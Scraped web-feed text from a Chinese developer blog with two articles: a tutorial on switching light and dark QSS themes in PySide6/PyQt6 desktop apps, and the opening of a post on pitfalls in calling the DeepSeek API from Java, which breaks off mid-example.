itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            在PySide6/PyQt6的项目中实现样式切换处理
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/122769398839592/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    伍华聪
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T04:19:25.000Z" title="Tue Dec 09 2025 04:19:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在桌面应用开发中，“主题切换（深色 / 浅色模式）”已经不再是锦上添花的功能，而是逐渐成为一种用户刚需。尤其对于长时间使用的 ERP 工具类应用来说，良好的视觉舒适度对用户体验影响巨大。本篇随笔针对PySide6/PyQt6的项目的实现案例，介绍如何实现样式切换处理。</p>
<p>Qt 官方本身提供了 <code>QStyle</code> 体系，但如果想做到：</p>
<ul>
<li>可自定义配色</li>
<li>可作为品牌皮肤</li>
<li>可热切换（无需重启）</li>
<li>多主题共存</li>
<li>可持久化</li>
</ul>
<p>那么，<strong>采用 QSS (Qt Style Sheet) + 统一主题管理器的方案无疑是目前最成熟、最实用、性价比最高的选择。</strong></p>
<p>本文将从 <strong>原理 → 架构设计 → 实现方式 → 最佳实践</strong> 四个维度，完整介绍在 PySide6 / PyQt6 项目中如何构建一套“企业级主题切换系统”。</p>
<h3 data-id="heading-0">一、为什么不能简单地用 <code>setStyle</code>？</h3>
<p>很多初学者在做样式适配时，都会走入一个误区：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">btn</span><span class="hljs-selector-class">.setStyleSheet</span>(<span class="hljs-string">"background:red"</span>)
<span class="hljs-selector-tag">table</span><span class="hljs-selector-class">.setStyleSheet</span>(<span class="hljs-string">"color:white"</span>)
...
</code></pre>
<p>这种写法短期“能用”，长期会带来三个严重问题：</p>
<ol>
<li>样式分散，难维护</li>
</ol>
<p>不同窗口、不同控件中的样式写法彼此独立，一个主题改动需要满项目搜索替换，很容易遗漏。</p>
<hr/>
<ol start="2">
<li>逻辑和表现混杂</li>
</ol>
<p>UI 逻辑代码被大量 CSS 淹没，维护成本剧增，违反基本的架构解耦原则。</p>
<hr/>
<ol start="3">
<li>无法进行主题切换</li>
</ol>
<p>没有分主题文件结构，一旦需要切换风格就必须“重写所有 setStyle”，几乎不可实现。</p>
<hr/>
<p>✅ 因此，<strong>如果项目规模超过 3 个界面，我们就必须放弃零散 setStyle 写法，转而使用 QSS 主题体系。</strong></p>
<h3 data-id="heading-1">二、什么是 QSS？</h3>
<p>Qt 中的 <strong>QSS (Qt Style Sheet)</strong>  本质和 CSS 非常类似，几乎可以视为 CSS 在 Qt 世界中的实现。</p>
<p>对 Qt 控件来说：</p>
<ul>
<li><code>QWidget</code> → HTML 标签</li>
<li><code>QPushButton</code>、<code>QTableView</code> → CSS 选择器</li>
<li><code>background / border / padding / color</code> → 样式属性</li>
</ul>
<p>例如：</p>
<pre><code class="hljs language-css" lang="css">QPushButton {
    <span class="hljs-attribute">background</span>: <span class="hljs-number">#3a3a3a</span>;
    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">6px</span>;
    <span class="hljs-attribute">color</span>: white;
}
</code></pre>
<p>QSS 能做到：</p>
<ul>
<li>全局覆盖</li>
<li>继承 &amp; 层级作用</li>
<li>精准控件控制</li>
<li>即时加载刷新</li>
</ul>
<p>我们希望做到：</p>
<blockquote>
<p><strong>业务代码永远不接触 CSS</strong><br/>
<strong>主题由独立模块统一调度</strong></p>
</blockquote>
<pre><code class="hljs language-css" lang="css">project/
│
├── <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.py</span>
├── core/
│   └── theme_manager<span class="hljs-selector-class">.py</span>
└── themes/
    ├── light<span class="hljs-selector-class">.qss</span>
    └── dark<span class="hljs-selector-class">.qss</span>
</code></pre>
<p>通过 ThemeManager 将 UI 层与样式层完全隔离，可读性和可维护性大幅提升。</p>
<p>我们需要一个负责三件事的主题管理器统一类：</p>
<ul>
<li>读取主题文件</li>
<li>调用 Qt API 应用主题</li>
<li>记录并恢复用户选择</li>
</ul>
<p>QSS 主题文件设计示例：以下是一个简化版本：</p>
<p>浅色主题</p>
<pre><code class="hljs language-css" lang="css">QWidget {
    <span class="hljs-attribute">background</span>: <span class="hljs-number">#ffffff</span>;
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#202020</span>;
}

QPushButton {
    <span class="hljs-attribute">background</span>: <span class="hljs-number">#e8e8e8</span>;
    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;
}
</code></pre>
<p>深色主题</p>
<pre><code class="hljs language-css" lang="css">QWidget {
    <span class="hljs-attribute">background</span>: <span class="hljs-number">#2b2b2b</span>;
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#f0f0f0</span>;
}

QPushButton {
    <span class="hljs-attribute">background</span>: <span class="hljs-number">#3a3a3a</span>;
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#ffffff</span>;
}
</code></pre>
<h3 data-id="heading-2">三、UI 中的使用方式</h3>
<p>我们通过创建系统相关的菜单，如定义样式切换的菜单，然后绑定对应的菜单信号处理。</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">action_dark</span><span class="hljs-selector-class">.triggered</span><span class="hljs-selector-class">.connect</span>(<span class="hljs-attribute">lambda</span>: ThemeManager.<span class="hljs-built_in">apply</span>(<span class="hljs-string">"dark"</span>))
<span class="hljs-selector-tag">action_light</span><span class="hljs-selector-class">.triggered</span><span class="hljs-selector-class">.connect</span>(<span class="hljs-attribute">lambda</span>: ThemeManager.<span class="hljs-built_in">apply</span>(<span class="hljs-string">"light"</span>))
</code></pre>
<p>这样切换的时候，无需重启——Qt 会自动刷新全部控件。</p>
<p>通过样式管理器，实现不同主题演示的即时切换。</p>
<p><strong>主题系统并不是简单的“换几个颜色”。</strong></p>
<p>它是 UI 架构中不可忽视的一环：</p>
<ul>
<li>影响可维护性</li>
<li>决定代码整洁度</li>
<li>直接关系用户体验</li>
</ul>
<hr/>
<p>在 PySide6 / PyQt6 中，</p>
<blockquote>
<p><strong>QSS + ThemeManager + 动态切换 + 持久化</strong></p>
</blockquote>
<p>这一套组合，几乎是目前最成熟可靠的主题实现方案，没有之一。</p>
<p>真正的统一UI的样式，包含 5 个维度：</p>





























<table><thead><tr><th>维度</th><th>说明</th></tr></thead><tbody><tr><td>色板统一</td><td>背景色、主色、强调色、警示色</td></tr><tr><td>字体统一</td><td>字体家族、字号梯度</td></tr><tr><td>控件形态</td><td>圆角、border、padding</td></tr><tr><td>交互动效</td><td>hover、press、disable</td></tr><tr><td>布局密度</td><td>表格行距、控件间距</td></tr></tbody></table>
<h3 data-id="heading-3">四、具体在PySide6/PyQt6的项目中的实践过程</h3>
<p>我们根据前面的介绍，在项目目录中创建两个不同主题样式的文件，如下所示。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/239c06a219854f5392e2846ec50e74cc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LyN5Y2O6IGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858764&amp;x-signature=tRIu6QEqRsbYB%2BtqvFHkEfa6Ohk%3D" alt="image" loading="lazy"/></p>
<p>然后根据样式的需要定义对应的相关内容，如下是浅色的主题定义，通过定义对应控件的颜色、字体、背景色等相关属性，实现统一的效果。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6b89407e611640bb8969203a83f67751~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LyN5Y2O6IGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858764&amp;x-signature=mGe5yYtjnOavWZD%2BhP1sI4cUu4M%3D" alt="image" loading="lazy"/></p>
<p>通过辅助类，我们创建几个菜单来实现不同样式的切换。</p>
<pre><code class="hljs language-php" lang="php">        theme_menu = menu_bar.<span class="hljs-title function_ invoke__">addMenu</span>(<span class="hljs-string">"界面主题"</span>)
        light_action = ControlUtil.<span class="hljs-title function_ invoke__">create_menu</span>(
            <span class="hljs-built_in">self</span>, theme_menu, <span class="hljs-string">"浅色主题"</span>, <span class="hljs-string">"info"</span>
        )
        light_action.triggered.<span class="hljs-title function_ invoke__">connect</span>(<span class="hljs-attr">lambda</span>: <span class="hljs-built_in">self</span>.<span class="hljs-title function_ invoke__">set_theme</span>(<span class="hljs-number">1</span>))
        dark_action = ControlUtil.<span class="hljs-title function_ invoke__">create_menu</span>(
            <span class="hljs-built_in">self</span>, theme_menu, <span class="hljs-string">"深色主题"</span>, <span class="hljs-string">"info"</span>
        )
        dark_action.triggered.<span class="hljs-title function_ invoke__">connect</span>(<span class="hljs-attr">lambda</span>: <span class="hljs-built_in">self</span>.<span class="hljs-title function_ invoke__">set_theme</span>(<span class="hljs-number">2</span>))
        system_action = ControlUtil.<span class="hljs-title function_ invoke__">create_menu</span>(
            <span class="hljs-built_in">self</span>, theme_menu, <span class="hljs-string">"初始主题"</span>, <span class="hljs-string">"info"</span>
        )
        system_action.triggered.<span class="hljs-title function_ invoke__">connect</span>(<span class="hljs-attr">lambda</span>: <span class="hljs-built_in">self</span>.<span class="hljs-title function_ invoke__">set_theme</span>(<span class="hljs-number">0</span>))
</code></pre>
<p>菜单界面效果如下所示。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2a0810ab1b284bb1a4af34ca41d69d04~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LyN5Y2O6IGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858764&amp;x-signature=0tdI52q0X8UUajcSdDBKncqnrJc%3D" alt="image" loading="lazy"/></p>
<p>其中样式的信号处理，我们通过一个单件的样式总线对象来处理。</p>
<pre><code class="hljs language-python" lang="python">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">set_theme</span>(<span class="hljs-params">self, theme_type</span>):
        <span class="hljs-string">"""设置主题颜色"""</span>
        self.theme_type = theme_type
        <span class="hljs-comment"># 切换主题颜色</span>
        ThemeBus().set_theme_type(self.theme_type)
</code></pre>
<p>其中，我们对样式总线对象的变化进行信号绑定处理。</p>
<pre><code class="hljs language-scss" lang="scss">        #监听主题变化的事件
        <span class="hljs-built_in">ThemeBus</span>()<span class="hljs-selector-class">.theme_type_changed</span><span class="hljs-selector-class">.connect</span>(self.on_theme_changed)
</code></pre>
<p>对主题样式的变化进行处理。</p>
<pre><code class="hljs language-python" lang="python">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">on_theme_changed</span>(<span class="hljs-params">self, theme_type</span>):
        <span class="hljs-string">"""主题变化的事件处理"""</span>
        
        theme_map = {
            <span class="hljs-number">1</span>: <span class="hljs-string">"light"</span>,
            <span class="hljs-number">2</span>: <span class="hljs-string">"dark"</span>,
            <span class="hljs-number">0</span>: <span class="hljs-string">""</span> <span class="hljs-comment">#不设置主题，默认使用系统主题</span>
        } 
        theme_name = theme_map[self.theme_type]

        self.log.info(<span class="hljs-string">f"主题变化: <span class="hljs-subst">{theme_type}</span>：<span class="hljs-subst">{theme_name}</span>"</span>)
        <span class="hljs-comment"># 切换主题颜色</span>
        ThemedHelper.apply(theme_type)
</code></pre>
<p>这个主题的辅助类，主要就是根据当前总线的样式值，加载对应的样式文件进行设置，如果为空，这还原为最初的默认样式。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ThemedHelper</span>:
    <span class="hljs-string">"""控件主题辅助类"""</span>
 
<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">apply</span>(<span class="hljs-params">theme_type: <span class="hljs-built_in">int</span> = <span class="hljs-number">0</span></span>):
        <span class="hljs-string">"""应用主题样式"""</span>
        theme_name =  <span class="hljs-string">""</span>
        <span class="hljs-keyword">if</span> theme_type == <span class="hljs-number">1</span>:
            theme_name= <span class="hljs-string">"light"</span>
        <span class="hljs-keyword">elif</span> theme_type == <span class="hljs-number">2</span>:
            theme_name= <span class="hljs-string">"dark"</span> 
        <span class="hljs-keyword">else</span>:
            theme_name = <span class="hljs-string">""</span>
            
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> theme_name:
            qss = <span class="hljs-string">""</span> <span class="hljs-comment"># 自动主题， 无需加载 qss 文件</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f"app/themes/<span class="hljs-subst">{theme_name}</span>.qss"</span>, encoding=<span class="hljs-string">"utf8"</span>) <span class="hljs-keyword">as</span> f:
                qss = f.read()
        
        app : QApplication = QApplication.instance()
        <span class="hljs-keyword">if</span> app:
            app.setStyle(<span class="hljs-string">"Fusion"</span>)
            app.setStyleSheet(qss)
</code></pre>
<p>暗色主题的效果如下所示。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a1244d31efa4f278f5b8913cd461f73~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LyN5Y2O6IGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858764&amp;x-signature=1JWUCHIyEMsTPezKk1IrV1LtPqc%3D" alt="image" loading="lazy"/></p>
<p> 如果不喜欢厚重的主题，我们也可以切换会原来的默认主题。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b1ba34154ee54ab88d8f8245075b7d7d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LyN5Y2O6IGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858764&amp;x-signature=%2FOyO0Wju%2FhDXbQ3UUo8gOqN9Vls%3D" alt="image" loading="lazy"/></p>
<p>以上就是我们在定义不同主题，实现主题切换的过程，我们可以根据需要，定义更多有特色的主题样式，而具有统一效果的主题样式，我们可以通过AI的询问方式，获得完整的样式代码，从而构建个性化的效果。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Java 调用 DeepSeek API 的 8 个高频坑]]></title>    <link>https://juejin.cn/post/7581423932613771304</link>    <guid>https://juejin.cn/post/7581423932613771304</guid>    <pubDate>2025-12-09T04:01:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581423932613771304" data-draft-id="7581437632854212648" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Java 调用 DeepSeek API 的 8 个高频坑"/> <meta itemprop="keywords" content="后端,Java,人工智能"/> <meta itemprop="datePublished" content="2025-12-09T04:01:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员丘山"/> <meta itemprop="url" content="https://juejin.cn/user/272334615219629"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Java 调用 DeepSeek API 的 8 个高频坑
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/272334615219629/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员丘山
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T04:01:54.000Z" title="Tue Dec 09 2025 04:01:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读18分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>现在大模型开发特别火，DeepSeek 因为中文理解好、反应快、还便宜，不少 Java 开发者都用它。但实际写代码的时候，好多人因为没搞懂 API 机制、Java 并发这些东西，踩了不少坑：Token 过期把服务搞挂、多线程调用数据乱了、长文本传进去直接报错……
结合项目的经验，把最常踩的 8 个坑拆明白，从为啥会踩坑、怎么解决，到能直接用的代码，全给你说明白，帮你顺顺利利把 DeepSeek 集成到项目里。</p>
<h2 data-id="heading-1">一、坑 1：Token 过期未处理，鉴权异常引发服务中断</h2>
<h3 data-id="heading-2">问题本质</h3>
<p>DeepSeek 的 Token 一般能用 30 天，好多人一开始就把 Token 写在代码里，根本没考虑过期的事。一旦 Token 过期，所有 API 调用全返回 401 鉴权失败，如果没做异常处理，就会直接导致依赖该接口的业务服务中断。更糟的是，有的代码连异常都不捕获，直接抛个运行时异常，把线程池堵死，最后服务都熔断了。</p>
<h3 data-id="heading-3">典型错误代码</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 错误示例：硬编码Token，无过期处理、无异常捕获</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeepSeekClient</span> {
    <span class="hljs-comment">// 写死的 Token，过期直接失效</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEEPSEEK_TOKEN</span> <span class="hljs-operator">=</span> <span class="hljs-string">"sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">API_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">"https://api.deepseek.com/v1/chat/completions"</span>;

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">callApi</span><span class="hljs-params">(String prompt)</span> {
        <span class="hljs-comment">// 直接拼 Token，不管过没过期</span>
        <span class="hljs-type">HttpHeaders</span> <span class="hljs-variable">headers</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpHeaders</span>();
        headers.set(<span class="hljs-string">"Authorization"</span>, <span class="hljs-string">"Bearer "</span> + DEEPSEEK_TOKEN);
        headers.setContentType(MediaType.APPLICATION_JSON);

        <span class="hljs-comment">// 拼请求体</span>
        Map&lt;String, Object&gt; requestBody = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        requestBody.put(<span class="hljs-string">"model"</span>, <span class="hljs-string">"deepseek-chat"</span>);
        requestBody.put(<span class="hljs-string">"messages"</span>, Collections.singletonList(
                Map.of(<span class="hljs-string">"role"</span>, <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>, prompt)
        ));

        <span class="hljs-type">RestTemplate</span> <span class="hljs-variable">restTemplate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RestTemplate</span>();
